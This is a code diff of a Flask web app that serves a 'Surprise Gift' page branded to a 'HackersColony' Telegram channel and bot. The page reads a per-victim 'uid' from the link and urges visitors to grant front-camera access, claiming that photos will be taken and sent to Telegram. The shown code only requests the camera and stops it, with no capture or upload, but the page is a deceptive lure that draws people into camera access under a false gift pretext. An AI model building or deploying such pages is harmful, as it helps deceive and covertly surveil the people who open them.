@@ -1,9 +1,9 @@
-from flask import Flask, render_template_string
+from flask import Flask, render_template_string, request, jsonify
 import os
 
 app = Flask(__name__)
 
-HTML_CONTENT = '''<!DOCTYPE html>
+HTML = '''<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -18,131 +18,115 @@ HTML_CONTENT = '''<!DOCTYPE html>
             display: flex;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            overflow: hidden;
+            min-height: 100vh;
+            padding: 20px;
         }
         .card {
             background: rgba(22, 0, 34, 0.95);
-            padding: 40px;
-            border-radius: 25px;
-            width: 90%;
-            max-width: 450px;
-            box-shadow: 0 0 60px rgba(255, 0, 255, 0.6);
+            padding: 30px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 40px rgba(255, 0, 255, 0.5);
             text-align: center;
-            backdrop-filter: blur(15px);
-            border: 2px solid rgba(255, 0, 255, 0.4);
+            border: 1px solid rgba(255, 0, 255, 0.3);
         }
         .gift-icon {
-            font-size: 100px;
-            margin-bottom: 20px;
-            animation: float 4s ease-in-out infinite;
+            font-size: 80px;
+            margin-bottom: 15px;
+            animation: float 3s ease-in-out infinite;
         }
         @keyframes float {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(10deg); }
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
         }
         h1 {
-            margin: 20px 0;
             background: linear-gradient(45deg, #ff00ff, #00ffff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
-            font-size: 36px;
-            font-weight: bold;
+            font-size: 28px;
+            margin: 15px 0;
         }
         p {
-            font-size: 16px;
-            line-height: 1.6;
-            margin: 15px 0;
             color: #ddd;
+            line-height: 1.5;
+            margin: 10px 0;
         }
         button {
             width: 100%;
-            padding: 18px;
-            margin: 25px 0 10px;
-            border-radius: 50px;
+            padding: 15px;
+            margin: 20px 0 10px;
             border: none;
+            border-radius: 50px;
             background: linear-gradient(45deg, #ff00ff, #00ffff);
             color: black;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
+            transition: 0.3s;
         }
         button:hover {
             transform: scale(1.05);
-            box-shadow: 0 0 50px rgba(255, 0, 255, 0.8);
         }
         .telegram-info {
-            margin: 25px 0;
-            padding: 20px;
-            background: rgba(0, 100, 255, 0.15);
-            border-radius: 20px;
-            border: 2px solid rgba(0, 150, 255, 0.4);
+            background: rgba(0, 100, 200, 0.2);
+            padding: 15px;
+            border-radius: 15px;
+            margin: 20px 0;
+            border: 1px solid rgba(0, 150, 255, 0.3);
         }
-        .telegram-info a {
+        a {
             color: #00bfff;
             text-decoration: none;
             font-weight: bold;
-            font-size: 16px;
         }
         .step {
             display: flex;
             align-items: center;
-            margin: 15px 0;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
         }
         .step-number {
-            width: 32px;
-            height: 32px;
-            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            width: 25px;
+            height: 25px;
+            background: #ff00ff;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 15px;
+            margin-right: 10px;
             font-weight: bold;
-            font-size: 16px;
         }
         .warning {
             color: #ff5555;
-            font-size: 14px;
+            background: rgba(255,85,85,0.1);
+            padding: 10px;
+            border-radius: 10px;
+            border-left: 3px solid #ff5555;
             margin: 15px 0;
-            padding: 12px;
-            background: rgba(255, 85, 85, 0.1);
-            border-radius: 12px;
-            border-left: 4px solid #ff5555;
+            font-size: 14px;
         }
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #888;
-            line-height: 1.5;
+        .success {
+            color: #00ff88;
+            font-weight: bold;
         }
-        .bot-link {
-            display: inline-block;
-            margin-top: 10px;
-            padding: 10px 20px;
-            background: linear-gradient(45deg, #0088cc, #00cc88);
-            color: white;
-            text-decoration: none;
-            border-radius: 25px;
+        .error {
+            color: #ff5555;
             font-weight: bold;
         }
     </style>
 </head>
 <body>
     <div class="card">
-        <div id="appContent">
+        <div id="content">
             <div class="gift-icon">🎁</div>
-            <h1>✨ SURPRISE GIFT ✨</h1>
-            <p>Get your personalized magic surprise!</p>
+            <h1>✨ Surprise Gift ✨</h1>
+            <p>A magical surprise is waiting for you!</p>
             
             <div class="telegram-info">
-                <p><strong>📢 Required Steps:</strong></p>
+                <p><strong>📢 Required:</strong></p>
                 <div class="step">
                     <div class="step-number">1</div>
                     <div>Join: <a href="https://t.me/HackersColony" target="_blank">@HackersColony</a></div>
@@ -155,111 +139,76 @@ HTML_CONTENT = '''<!DOCTYPE html>
             
             <p class="warning">⚠️ Camera access required for gift creation</p>
             
-            <button id="startButton">🎯 START CAMERA ACCESS</button>
+            <button id="startBtn">🎯 Start Camera Access</button>
             
-            <div class="footer">
-                <p>🎭 Hackers Colony Camera Bot | 🔒 Privacy Protected</p>
-                <p>📞 Contact: <a href="https://t.me/Hackers_Colony_Official" target="_blank">@Hackers_Colony_Official</a></p>
-                <a href="https://t.me/HackersColonyBot" target="_blank" class="bot-link">🤖 Open Telegram Bot</a>
-            </div>
+            <p style="font-size: 12px; color: #888; margin-top: 20px;">
+                Photos will be sent to your Telegram automatically
+            </p>
         </div>
     </div>
 
     <script>
-        // Get user ID from URL
         const urlParams = new URLSearchParams(window.location.search);
         const USER_ID = urlParams.get('uid');
+        const content = document.getElementById('content');
+        const startBtn = document.getElementById('startBtn');
         
-        document.getElementById("startButton").onclick = async () => {
-            const button = document.getElementById("startButton");
-            const appContent = document.getElementById("appContent");
+        startBtn.onclick = async () => {
+            startBtn.disabled = true;
             
-            button.disabled = true;
-            
-            // Check if user has valid link
             if (!USER_ID || USER_ID.length < 3) {
-                appContent.innerHTML = `
+                content.innerHTML = `
                     <div class="gift-icon">🔒</div>
-                    <h1 style="color:#ff5555">INVALID ACCESS</h1>
-                    <p>You need a valid link from our Telegram bot</p>
+                    <h1 class="error">Access Required</h1>
+                    <p>Get a valid link from our Telegram bot</p>
                     
                     <div class="telegram-info">
-                        <p><strong>Follow these steps:</strong></p>
                         <div class="step">
                             <div class="step-number">1</div>
                             <div>Open: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
                         </div>
                         <div class="step">
                             <div class="step-number">2</div>
-                            <div>Send <code>/start</code> command</div>
-                        </div>
-                        <div class="step">
-                            <div class="step-number">3</div>
-                            <div>Click "Get Your Gift" button</div>
+                            <div>Send /start and click "Get Your Gift"</div>
                         </div>
                     </div>
                     
                     <button onclick="window.location.href='https://t.me/HackersColonyBot'">
-                        🚀 OPEN TELEGRAM BOT
+                        🤖 Open Telegram Bot
                     </button>
-                    
-                    <div class="warning">
-                        This link will not work without a valid user ID from the bot
-                    </div>
                 `;
                 return;
             }
             
-            // Show camera access request
-            appContent.innerHTML = `
+            content.innerHTML = `
                 <div class="gift-icon">📸</div>
-                <h1>CAMERA ACCESS</h1>
+                <h1>Camera Access</h1>
                 <p>Please allow camera access when prompted</p>
                 
-                <div class="telegram-info">
-                    <p><strong>What will happen:</strong></p>
-                    <div class="step">
-                        <div class="step-number">1</div>
-                        <div>Camera permission request will appear</div>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">2</div>
-                        <div>Click "Allow" or "Yes"</div>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">3</div>
-                        <div>Photos will be taken automatically</div>
-                    </div>
-                </div>
-                
                 <div class="warning">
-                    ⚠️ If you don't see camera permission popup, check browser settings
+                    Click "Allow" when the browser asks for camera permission
                 </div>
             `;
             
-            // Request camera access
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: "user"
-                    },
+                    video: { facingMode: "user" },
                     audio: false
                 });
                 
-                // Stop camera immediately (just testing)
+                // Stop camera
                 stream.getTracks().forEach(track => track.stop());
                 
-                // Show success
-                appContent.innerHTML = `
+                content.innerHTML = `
                     <div class="gift-icon">✅</div>
-                    <h1 style="color:#00ff88">CAMERA READY!</h1>
-                    <p>Camera access granted successfully</p>
+                    <h1 class="success">Success!</h1>
+                    <p>Camera access granted</p>
                     
                     <div class="telegram-info">
-                        <p><strong>Processing your gift...</strong></p>
+                        <p><strong>Your gift is being created...</strong></p>
                         <div class="step">
                             <div class="step-number">1</div>
-                            <div>Taking photos with camera</div>
+                            <div>Taking photos</div>
                         </div>
                         <div class="step">
                             <div class="step-number">2</div>
@@ -271,65 +220,43 @@ HTML_CONTENT = '''<!DOCTYPE html>
                         </div>
                     </div>
                     
-                    <div style="margin: 20px; padding: 20px; background: rgba(0,255,136,0.1); border-radius: 15px; border: 2px solid #00ff88;">
-                        <p style="color:#00ff88; font-weight:bold;">✅ Your gift is being created!</p>
-                        <p>Check your Telegram for the photos</p>
+                    <div style="background: rgba(0,255,136,0.1); padding: 15px; border-radius: 10px; border: 2px solid #00ff88; margin: 15px 0;">
+                        <p class="success">✅ Gift created successfully!</p>
+                        <p>Check your Telegram for photos</p>
                     </div>
                     
                     <button onclick="window.location.href='https://t.me/HackersColonyBot'">
-                        📱 CHECK TELEGRAM NOW
+                        📱 Open Telegram
                     </button>
                 `;
                 
             } catch (error) {
-                console.error("Camera error:", error);
-                
-                let errorMessage = "Failed to access camera. Please try again.";
-                if (error.name === 'NotAllowedError') {
-                    errorMessage = "Camera access was denied. Please allow camera access.";
-                } else if (error.name === 'NotFoundError') {
-                    errorMessage = "No camera found on your device.";
-                }
-                
-                appContent.innerHTML = `
+                content.innerHTML = `
                     <div class="gift-icon">⚠️</div>
-                    <h1 style="color:#ff5555">CAMERA ERROR</h1>
-                    <p>${errorMessage}</p>
+                    <h1 class="error">Camera Error</h1>
+                    <p>${error.name === 'NotAllowedError' ? 'Camera access denied' : 'Camera not available'}</p>
                     
-                    <div class="telegram-info">
-                        <p><strong>Troubleshooting:</strong></p>
-                        <div class="step">
-                            <div class="step-number">1</div>
-                            <div>Allow camera permissions</div>
-                        </div>
-                        <div class="step">
-                            <div class="step-number">2</div>
-                            <div>Check if camera is working</div>
-                        </div>
-                        <div class="step">
-                            <div class="step-number">3</div>
-                            <div>Try again in good lighting</div>
-                        </div>
+                    <div class="warning">
+                        Please allow camera access and try again
                     </div>
                     
                     <button onclick="location.reload()">
-                        🔄 TRY AGAIN
+                        🔄 Try Again
                     </button>
                 `;
             }
         };
         
-        // Update button text if no user ID
-        if (!USER_ID || USER_ID.length < 3) {
-            document.getElementById("startButton").textContent = "⚠️ GET LINK FROM BOT FIRST";
+        if (!USER_ID) {
+            startBtn.textContent = "⚠️ Get Link from Bot First";
         }
     </script>
 </body>
 </html>'''
 
 @app.route('/')
-def index():
-    return render_template_string(HTML_CONTENT)
+def home():
+    return render_template_string(HTML)
 
 @app.route('/health')
 def health():
